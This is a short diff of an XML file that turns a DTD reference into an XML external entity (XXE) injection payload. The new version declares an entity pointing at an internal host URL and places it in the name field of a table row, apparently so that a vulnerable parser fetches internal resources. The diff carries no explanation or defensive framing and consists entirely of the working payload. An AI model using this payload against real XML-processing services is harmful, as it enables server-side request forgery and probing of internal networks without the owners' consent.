@@ -1,7 +1,8 @@
-<!DOCTYPE dtd SYSTEM “https://127.0.0.1:445”>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 <table_data>
      <table_row>
-          <name>&dtd;</name>
+          <name>&xxe;</name>
           <nickname>mypasstron</nickname>
           <age>18</age>
           <level>Colonel rank 18</level>
